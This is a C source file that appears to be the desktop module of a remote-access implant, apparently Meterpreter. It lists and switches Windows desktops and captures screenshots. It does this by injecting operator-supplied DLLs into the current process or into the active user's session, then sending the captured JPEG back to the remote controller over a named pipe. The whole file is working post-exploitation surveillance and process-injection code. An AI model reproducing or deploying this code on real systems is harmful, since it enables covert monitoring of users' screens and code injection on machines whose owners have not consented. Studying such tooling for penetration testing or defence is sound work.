#include "precomp.h"
#include "./../sys/session.h"
#include "./../sys/process/ps.h"

typedef struct _DESKTOPLIST
{
	DWORD dwSessionId;
	char * cpStationName;
	Packet * response;
} DESKTOPLIST, *LPDESKTOPLIST;

/*
 * Callback function for EnumDesktops when listing desktops on a station during desktop_list().
 */
BOOL CALLBACK desktop_enumdesktops_callback( LPTSTR cpDesktopName, LPARAM lpParam )
{
	DESKTOPLIST * dl    = NULL;
	Tlv entry[3]        = {0};
	DWORD dwSessionId   = 0;

	do
	{
		dl = (DESKTOPLIST *)lpParam;
		if( !dl )
			break;

		if( !dl->cpStationName || !dl->response  || !cpDesktopName )
			break;

		dwSessionId            = htonl( dl->dwSessionId );

		entry[0].header.type   = TLV_TYPE_DESKTOP_SESSION;
		entry[0].header.length = sizeof(DWORD);
		entry[0].buffer        = (PUCHAR)&dwSessionId;
		
		entry[1].header.type   = TLV_TYPE_DESKTOP_STATION;
		entry[1].header.length = (DWORD)(strlen(dl->cpStationName) + 1);
		entry[1].buffer        = (PUCHAR)dl->cpStationName;
		
		entry[2].header.type   = TLV_TYPE_DESKTOP_NAME;
		entry[2].header.length = (DWORD)(strlen(cpDesktopName) + 1);
		entry[2].buffer        = (PUCHAR)cpDesktopName;

		packet_add_tlv_group( dl->response, TLV_TYPE_DESKTOP, entry, 3 );

	} while( 0 );

	return TRUE;
}

/*
 * Callback function for EnumWindowStations when listing stations during request_ui_desktop_enum().
 */
BOOL CALLBACK desktop_enumstations_callback( LPTSTR cpStationName, LPARAM param )
{
	HWINSTA hWindowStation = NULL;
	DESKTOPLIST dl         = {0};

	do
	{
		hWindowStation = OpenWindowStation( cpStationName, FALSE, MAXIMUM_ALLOWED ); // WINSTA_ALL_ACCESS
		if( !hWindowStation )
			break;
		
		dl.dwSessionId   = session_id( GetCurrentProcessId() );
		dl.response      = (Packet *)param;
		dl.cpStationName = cpStationName;

		EnumDesktops( hWindowStation, desktop_enumdesktops_callback, (LPARAM)&dl );

	} while( 0 );

	if( hWindowStation )
		CloseWindowStation( hWindowStation );

	return TRUE;
}

/*
 * Enumerate all accessible desktops on all stations.
 */
DWORD request_ui_desktop_enum( Remote * remote, Packet * request )
{
	DWORD dwResult    = ERROR_SUCCESS;
	Packet * response = NULL;

	do
	{
		response = packet_create_response( request );
		if( !response )
			BREAK_WITH_ERROR( "[UI] desktop_enum. packet_create_response failed", ERROR_INVALID_HANDLE );

		EnumWindowStations( desktop_enumstations_callback, (LPARAM)response );

	} while( 0 );

	if( response )
		packet_transmit_response( dwResult, remote, response );
	
	return ERROR_SUCCESS;
}

/*
 * Get the session/windows station/desktop we are currently using.
 */
DWORD request_ui_desktop_get( Remote * remote, Packet * request )
{
	DWORD dwResult    = ERROR_SUCCESS;
	Packet * response = NULL;

	do
	{
		response = packet_create_response( request );
		if( !response )
			BREAK_WITH_ERROR( "[UI] desktop_get. packet_create_response failed", ERROR_INVALID_HANDLE );

		lock_acquire( remote->lock );

		packet_add_tlv_uint( response, TLV_TYPE_DESKTOP_SESSION, remote->dwCurrentSessionId );
		packet_add_tlv_string( response, TLV_TYPE_DESKTOP_STATION, remote->cpCurrentStationName );
		packet_add_tlv_string( response, TLV_TYPE_DESKTOP_NAME, remote->cpCurrentDesktopName );

		lock_release( remote->lock );

	} while( 0 );

	if( response )
		packet_transmit_response( dwResult, remote, response );

	return ERROR_SUCCESS;
}

/*
 * Set this process to use a specified window station and this thread to use
 * a specified desktop.
 */
DWORD request_ui_desktop_set( Remote * remote, Packet * request )
{
	DWORD dwResult             = ERROR_SUCCESS;
	Packet * response          = NULL;
	char * cpDesktopName       = NULL;
	char * cpStationName       = NULL;
	HWINSTA hWindowStation     = NULL;
	HWINSTA hOrigWindowStation = NULL;
	HDESK hDesktop             = NULL;
	BOOL bSwitch               = FALSE;
	DWORD dwSessionId          = 0;

	do
	{
		response = packet_create_response( request );
		if( !response )
			BREAK_WITH_ERROR( "[UI] desktop_set. packet_create_response failed", ERROR_INVALID_HANDLE );
		
		dwSessionId = packet_get_tlv_value_uint( request, TLV_TYPE_DESKTOP_SESSION );
		if( !dwSessionId )
			BREAK_WITH_ERROR( "[UI] desktop_set. no TLV_TYPE_DESKTOP_SESSION provided", ERROR_INVALID_PARAMETER );
	
		if( dwSessionId == -1 )
			dwSessionId = session_id( GetCurrentProcessId() );

		cpStationName = packet_get_tlv_value_string( request, TLV_TYPE_DESKTOP_STATION );
		if( !cpStationName )
			BREAK_WITH_ERROR( "[UI] desktop_set. no TLV_TYPE_DESKTOP_STATION provided", ERROR_INVALID_PARAMETER );
	
		cpDesktopName = packet_get_tlv_value_string( request, TLV_TYPE_DESKTOP_NAME );
		if( !cpDesktopName )
			BREAK_WITH_ERROR( "[UI] desktop_set. no TLV_TYPE_DESKTOP_NAME provided", ERROR_INVALID_PARAMETER );
	
		bSwitch = packet_get_tlv_value_bool( request, TLV_TYPE_DESKTOP_SWITCH );

		dprintf( "[UI] desktop_set: Session %d\\%s\\%s (bSwitch=%d)", dwSessionId, cpStationName, cpDesktopName, bSwitch );
		
		// If we are switching desktop in our own session we proceed with the normal Windows API
		if( dwSessionId == session_id( GetCurrentProcessId() ) )
		{
			hWindowStation = OpenWindowStation( cpStationName, FALSE, WINSTA_ALL_ACCESS ); // WINSTA_ALL_ACCESS MAXIMUM_ALLOWED
			if( !hWindowStation )
			{
				if( RevertToSelf() )
					hWindowStation = OpenWindowStation( cpStationName, FALSE, WINSTA_ALL_ACCESS );
			}
			
			if( !hWindowStation )
				BREAK_WITH_ERROR( "[UI] desktop_set. Couldnt get the new Window Station", ERROR_INVALID_HANDLE );
			
			hOrigWindowStation = GetProcessWindowStation();
			
			if( !SetProcessWindowStation( hWindowStation ) )
				BREAK_ON_ERROR( "[UI] desktop_set. SetProcessWindowStation failed" );

			hDesktop = OpenDesktop( cpDesktopName, 0, FALSE, GENERIC_ALL );
			if( !hDesktop )
				BREAK_ON_ERROR( "[UI] desktop_set. OpenDesktop failed" );

			if( !SetThreadDesktop( hDesktop ) )
				BREAK_ON_ERROR( "[UI] desktop_set. SetThreadDesktop failed" );

			if( bSwitch )
			{
				if( !SwitchDesktop( hDesktop ) )
					BREAK_ON_ERROR( "[UI] desktop_set. SwitchDesktop failed" );
			}

			core_update_desktop( remote, dwSessionId, cpStationName, cpDesktopName );
		}
		else
		{
			// if we are to use a desktop from a session which is not our own...
			BREAK_WITH_ERROR( "[UI] desktop_set. Currently unable to set a desktop from an external session", ERROR_ACCESS_DENIED );
		}

	} while( 0 );

	if( response )
		packet_transmit_response( dwResult, remote, response );
	
	if( hDesktop )
		CloseDesktop( hDesktop );
	
	if( hWindowStation )
		CloseWindowStation( hWindowStation );
	
	if( hOrigWindowStation )
		SetProcessWindowStation( hOrigWindowStation );

	if( dwResult != ERROR_SUCCESS )
		core_update_desktop( remote, -1, NULL, NULL );

	return ERROR_SUCCESS;
}

/*
 * Worker thread for desktop screenshot. Creates a named pipe and reads in the 
 * screenshot for the first client which connects to it.
 */
DWORD THREADCALL desktop_screenshot_thread( THREAD * thread )
{
	DWORD dwResult     = ERROR_ACCESS_DENIED;
	HANDLE hServerPipe = NULL;
	HANDLE hToken      = NULL;
	char * cpNamedPipe = NULL;
	Packet * response  = NULL;
	BYTE * pBuffer     = NULL;
	DWORD dwRead       = 0;
	DWORD dwLength     = 0;
	DWORD dwTotal      = 0;

	do
	{
		if( !thread )
			BREAK_WITH_ERROR( "[UI] desktop_screenshot_thread. invalid thread", ERROR_BAD_ARGUMENTS );

		cpNamedPipe = (char *)thread->parameter1;
		response    = (Packet *)thread->parameter2;

		if( !cpNamedPipe || !response )
			BREAK_WITH_ERROR( "[UI] desktop_screenshot_thread. invalid thread arguments", ERROR_BAD_ARGUMENTS );

		dprintf("[UI] desktop_screenshot_thread. cpNamedPipe=%s", cpNamedPipe );

		// create the named pipe for the client service to connect to
		hServerPipe = CreateNamedPipe( cpNamedPipe, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE|PIPE_WAIT, 2, 0, 0, 0, NULL );
		if( !hServerPipe )
			BREAK_ON_ERROR( "[UI] desktop_screenshot_thread. CreateNamedPipe failed" );

		while( TRUE )
		{
			if( event_poll( thread->sigterm, 0 ) )
				BREAK_WITH_ERROR( "[UI] desktop_screenshot_thread. thread->sigterm received", ERROR_DBG_TERMINATE_THREAD );

			// wait for a client to connect to our named pipe...
			if( !ConnectNamedPipe( hServerPipe, NULL ) )
			{
				if( GetLastError() != ERROR_PIPE_CONNECTED )
					continue;
			}

			dprintf("[UI] desktop_screenshot_thread. got client conn.");

			if( !ReadFile( hServerPipe, &dwLength, sizeof(DWORD), &dwRead, NULL ) )
				BREAK_ON_ERROR( "[UI] desktop_screenshot_thread. ReadFile 1 failed" );

			// a client can send a zero length to indicate that it cant get a screenshot.
			if( !dwLength )
				BREAK_WITH_ERROR( "[UI] desktop_screenshot_thread. dwLength == 0", ERROR_BAD_LENGTH );

			pBuffer = (BYTE *)malloc( dwLength );
			if( !pBuffer )
				BREAK_WITH_ERROR( "[UI] desktop_screenshot_thread. pBuffer malloc failed", ERROR_INVALID_HANDLE );

			while( dwTotal < dwLength )
			{
				DWORD dwAvailable = 0;

				if( !PeekNamedPipe( hServerPipe, NULL, 0, NULL, &dwAvailable, NULL ) )
					break;

				if( !dwAvailable  )
				{
					Sleep( 100 );
					continue;
				}

				if( !ReadFile( hServerPipe, (LPVOID)(pBuffer + dwTotal), (dwLength - dwTotal), &dwRead, NULL ) )
					break;

				dwTotal += dwRead;
			}

			dwResult = packet_add_tlv_raw( response, TLV_TYPE_DESKTOP_SCREENSHOT, pBuffer, dwTotal );

			break;
		}

	} while( 0 );

	if( hServerPipe )
	{
		DisconnectNamedPipe( hServerPipe );
		CLOSE_HANDLE( hServerPipe );
	}

	if( pBuffer )
		free( pBuffer );

	dprintf( "[UI] desktop_screenshot_thread finishing, dwResult=%d", dwResult );

	return dwResult;
}

/*
 * Take a screenshot of the desktop and transmit the image (in JPEG format) back to the client.
 */
DWORD request_ui_desktop_screenshot( Remote * remote, Packet * request )
{
	DWORD dwResult              = ERROR_SUCCESS;
	Packet * response           = NULL;
	THREAD * pPipeThread        = NULL;
	LPVOID lpDllBuffer          = NULL;
	DLL_BUFFER DllBuffer        = {0};  
	char cNamedPipe[MAX_PATH]   = {0};
	char cCommandLine[MAX_PATH] = {0};
	int quality                 = 0;
	DWORD dwDllLength           = 0;
	DWORD dwPipeName            = 0;
	DWORD dwCurrentSessionId    = 0;
	DWORD dwActiveSessionId     = 0;

	do
	{
		response = packet_create_response( request );
		if( !response )
			BREAK_WITH_ERROR( "[UI] desktop_screenshot. packet_create_response failed", ERROR_INVALID_HANDLE );
		
		quality = packet_get_tlv_value_uint( request, TLV_TYPE_DESKTOP_SCREENSHOT_QUALITY );
		if( quality < 1 || quality > 100 )
			quality = 50;
	
		// get the x86 and x64 screenshot dll's. we are not obliged to send both but we reduce the number of processes
		// we can inject into (wow64 and x64) if we only send one type on an x64 system. If we are on an x86 system
		// we dont need to send the x64 screenshot dll as there will be no x64 processes to inject it into.
		DllBuffer.dwPE32DllLenght = packet_get_tlv_value_uint( request, TLV_TYPE_DESKTOP_SCREENSHOT_PE32DLL_LENGTH );
		DllBuffer.lpPE32DllBuffer = packet_get_tlv_value_string( request, TLV_TYPE_DESKTOP_SCREENSHOT_PE32DLL_BUFFER );

		DllBuffer.dwPE64DllLenght = packet_get_tlv_value_uint( request, TLV_TYPE_DESKTOP_SCREENSHOT_PE64DLL_LENGTH );
		DllBuffer.lpPE64DllBuffer = packet_get_tlv_value_string( request, TLV_TYPE_DESKTOP_SCREENSHOT_PE64DLL_BUFFER );

		if( !DllBuffer.lpPE32DllBuffer && !DllBuffer.lpPE64DllBuffer )
			BREAK_WITH_ERROR( "[UI] desktop_screenshot. Invalid dll arguments, at least 1 dll must be supplied", ERROR_BAD_ARGUMENTS );

		// get the session id that our host process belongs to
		dwCurrentSessionId = session_id( GetCurrentProcessId() );

		// get the session id for the interactive session
		dwActiveSessionId  = session_activeid();

		// create a uniuqe pipe name for our named pipe server
		dwPipeName         = GetTickCount();

		_snprintf( cNamedPipe, MAX_PATH, "\\\\.\\pipe\\%08X", dwPipeName );

		// create the commandline to pass to the screenshot dll when we inject it
		_snprintf( cCommandLine, MAX_PATH, "/s /q:%d /p:0x%08X\x00", quality, dwPipeName );
		
		dprintf( "[UI] desktop_screenshot. dwCurrentSessionId=%d, dwActiveSessionId=%d, cCommandLine=%s\n", dwCurrentSessionId, dwActiveSessionId, cCommandLine );

		// start a thread to create a named pipe server and wait for a client to connect an send back the JPEG screenshot.
		pPipeThread = thread_create( desktop_screenshot_thread, &cNamedPipe, response );
		if( !pPipeThread )
			BREAK_WITH_ERROR( "[UI] desktop_screenshot. thread_create failed", ERROR_INVALID_HANDLE );

		if( !thread_run( pPipeThread ) )
			BREAK_WITH_ERROR( "[UI] desktop_screenshot. thread_run failed", ERROR_ACCESS_DENIED );

		Sleep( 500 );

		// do the local process or session injection
		if( dwCurrentSessionId != dwActiveSessionId )
		{
			dprintf( "[UI] desktop_screenshot. Injecting into active session %d...\n", dwActiveSessionId );
			if( session_inject( dwActiveSessionId, &DllBuffer, cCommandLine ) != ERROR_SUCCESS )
				BREAK_WITH_ERROR( "[UI] desktop_screenshot. session_inject failed", ERROR_ACCESS_DENIED );
		}
		else
		{
			dprintf( "[UI] desktop_screenshot. Allready in the active session %d.\n", dwActiveSessionId );
			if( ps_inject( GetCurrentProcessId(), &DllBuffer, cCommandLine ) != ERROR_SUCCESS  )
				BREAK_WITH_ERROR( "[UI] desktop_screenshot. ps_inject current process failed", ERROR_ACCESS_DENIED );
		}

		// Wait for at most 30 seconds for the screenshot to happen...
		// If we have injected our code via APC injection, it may take a while for the target
		// thread to enter an alertable state and get our queued APC executed.
		WaitForSingleObject( pPipeThread->handle, 30000 );

		// signal our thread to terminate if it is still running.
		thread_sigterm( pPipeThread );
		
		// and wait for it to terminate...
		thread_join( pPipeThread );

		// get the exit code for our pthread
		if( !GetExitCodeThread( pPipeThread->handle, &dwResult ) )
			BREAK_WITH_ERROR( "[UI] desktop_screenshot. GetExitCodeThread failed", ERROR_INVALID_HANDLE );

	} while( 0 );

	if( response )
		packet_transmit_response( dwResult, remote, response );
	
	if( pPipeThread )
	{
		thread_sigterm( pPipeThread );
		thread_join( pPipeThread );
		thread_destroy( pPipeThread );
	}

	return dwResult;
}
